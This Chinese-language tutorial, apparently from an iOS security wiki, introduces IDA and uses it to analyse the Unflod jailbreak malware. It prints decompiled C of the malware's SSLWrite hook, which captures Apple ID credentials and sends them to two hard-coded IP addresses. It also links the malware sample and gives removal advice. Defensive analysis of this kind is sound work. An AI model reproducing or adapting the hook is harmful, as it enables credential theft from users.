[IDA](https://www.hex-rays.com/products/ida/index.shtml)是一个非常强大的反汇编和调试工具，支持Windows,Linux, Mac OS X平台，它支持太多的功能了，以至于其作者都不能在官方网站上对其进行详细的描述。

正式版本是需要收费的，正因为其功能强大，收费也非常贵。不过，它有试用版本可以下载，从[这](https://www.hex-rays.com/products/ida/support/download.shtml)找到[IDA demo download](https://www.hex-rays.com/products/ida/support/download_demo.shtml)，选择下载[IDA Demo 6.5 for Mac](http://out7.hex-rays.com/files/idademo65_mac.tgz)。

下载之后解压并运行，出现如下的示意图：

![](https://farm4.staticflickr.com/3808/14099831478_1b120a64ea.jpg)

过几秒会马上提示是否同意IDA协议，点击"agree"：

![](https://farm6.staticflickr.com/5592/14283147661_e59a264bf2_z.jpg)

然后会出现Quick Start，如下图：

![](https://farm3.staticflickr.com/2926/14283147801_1141f5958b_z.jpg)

选择其中的“New”，然后根据提示选择你需要分析的文件，就可以体验IDA的功能了。




###使用IDA分析iOS恶意软件Unflod

tdvx在Reddit上发帖说：从上周起，他用Snapchat和Google Hangouts的使用经常遇到crash，经过排查，他发现是下面这个可疑文件导致的：

    /Library/MobileSubstrate/DynamicLibraries/Unflod.dylib


这个恶意文件位于：/Library/MobileSubstrate/DynamicLibraries/Unflod.dylib或者framework.dylib。依赖于MobileSubstrate，只在越狱设备上起作用。



从[http://deev.es/9xq1](http://deev.es/9xq1)可以下载改恶意代码的样本，下载需谨慎操作。

下载到本地之后，用IDA打开，打开会出现如下图的提示，点击确定即可。

![](https://farm3.staticflickr.com/2901/14306659623_638b0ab9dd_b.jpg)

如果你觉得默认的字体太小，可以选择Option中的字体，在最右边的Size这一列修改。如下图所示：

![](https://farm4.staticflickr.com/3748/14263353696_1311933417_b.jpg)

其中一个API叫做replace_SSLWrite，如下图所示：

![](https://farm6.staticflickr.com/5273/14099796869_0991dbbd2f_b.jpg)
![](https://farm3.staticflickr.com/2903/14099916307_3ea5557be0_b.jpg)


使用IDA的插件F5一下，可以得到如下的代码：




    ｀int __fastcall replace_SSLWrite(int a1, char *a2, int a3, int a4)
     {
     ......
     
     if ( !findhead )
      {
        v19 = strstr(v22, "/WebObjects/MZFinance.woa/wa/authenticate HTTP/1.1");
        if ( v19 )
        {
          findhead = 1;
          strcpy(content, v22);
        }
      }
      if ( findhead == 1 )
      {
        v18 = strstr(v22, "<key>appleId</key>");
        v17 = strstr(v22, "<key>password</key>");
        if ( v18 )
        {
          if ( v17 )
          {
            strcat(content, v22);
            v16 = strstr(content, "</plist>");
            if ( v16 && v16 - content <= 2040 )
              v16[8] = 0;
            v14 = 0;
            v15 = socket(2, 1, 0);
            if ( v15 < 0 )
            {
              v24 = pSSLWrite(v23, v22, v21, v20);
              goto LABEL_20;
            }
            v13.sa_family = 2;
            *(_WORD *)&v13.sa_data[0] = 0xC61Eu;
            *(_DWORD *)&v13.sa_data[2] = inet_addr("23.88.10.4");
            if ( connect(v15, &v13, 0x10u) < 0 )
            {
              close(v15);
              v24 = pSSLWrite(v23, v22, v21, v20);
              goto LABEL_20;
            }
            v5 = v15;
            v6 = strlen(content);
            v14 = write(v5, content, v6);
            v11 = 0;
            close(v15);
            v12 = socket(2, 1, 0);
            if ( v12 < 0 )
            {
              v24 = pSSLWrite(v23, v22, v21, v20);
              goto LABEL_20;
            }
            v10.sa_family = 2;
            *(_WORD *)&v10.sa_data[0] = 0xC61Eu;
            *(_DWORD *)&v10.sa_data[2] = inet_addr("23.228.204.55");
            if ( connect(v12, &v10, 0x10u) < 0 )
            {
              close(v12);
              v24 = pSSLWrite(v23, v22, v21, v20);
              goto LABEL_20;
            }
            v7 = v12;
            v8 = strlen(content);
            v11 = write(v7, content, v8);
            close(v12);
            findhead = 2;
          }
        }
      }
      v24 = pSSLWrite(v23, v22, v21, v20);
    LABEL_20:
      if ( __stack_chk_guard != v25 )
        __stack_chk_fail(__stack_chk_guard, v24, v25, v4);
      return v24;
    }
    
    
    
    
   
   
 这个恶意代码通过 Hook Security.framework的SSLWrite方法（Hook函数为replace_SSLWrite），截取Apple id和密码，然后把这些信息发送到IP为23.88.10.4、3.228.204.55，端口为7878的服务器。（端口为7878，也就是上面的0xC61Eu。注意，这里是big endian模式。所以，端口其实是0x1EC6,即7878。）
 
 
 这个恶意软件被iPhone开发者证书签名。签名信息如下：

    $ codesign -vvvv -d Unflod.dylib
    Executable=./Unflod.dylib
    Identifier=com.your.framework
    Format=Mach-O thin (armv7)
    CodeDirectory v=20100 size=227 flags=0x0(none) hashes=3+5 location=embedded
    Hash type=sha1 size=20
    CDHash=da792624675e82b3460b426f869fbe718abea3f9
    Signature size=4322
    Authority=iPhone Developer: WANG XIN (P5KFURM8M8)
    Authority=Apple Worldwide Developer Relations Certification Authority
    Authority=Apple Root CA
    Signed Time=14 Feb 2014 04:32:58
    Info.plist=not bound
    Sealed Resources=none
    Internal requirements count=2 size=484
    
需要注意的是，**这并不表示这个人就是这个事情的始作俑者**。这个人可能是假冒的，也可能是其证书被偷窃，也可能是真正涉及到这个事情，但是，我们没有办法知道，但是，苹果需要调查这个事情。


####解决方法

如果你的设备上有Unflod.dylib/framework.dylib这两个文件，把其删掉，然后重新设置Apple id和密码就可以了。


###关于IDA的F5

IDA 中有一个插件Hex-Rays.Decompiler，其快捷键是F5，该插件可以轻易的把IDA中的汇编代码转成C代码，如上面的replace_SSLWrite所示，即使没有一点汇编基础的人都可以反汇编了。这个功能太强大，大家就把使用这个插件把汇编转成C代码的过程叫做F5一下。

请注意，F5插件是需要花钱买的，上面转成的代码，是别人转的，使用今天下载的试用版本，是没有F5这个功能的，这也可以理解，否则很多人应该都没必要去花钱买正式版本了。

####The IDA Pro book

它功能太强大，都可以写一本书专门来介绍它，事实上，确实存在这么一本书[The IDA Pro book, 2nd edition](http://idabook.com/index.html), 这本书有中文翻译[IDA Pro权威指南（第2版）](http://book.douban.com/subject/10463039/)


###小结

本节简要介绍了如何下载是使用IDA，更强大的功能需要渎职自己去探索，有兴趣的话可以找下文中提到的The IDA Pro book这本书读读，然后实践下。






 
 














***
[#3 Mac上需要安装的工具下的更多文章](http://security.ios-wiki.com/issue-3/)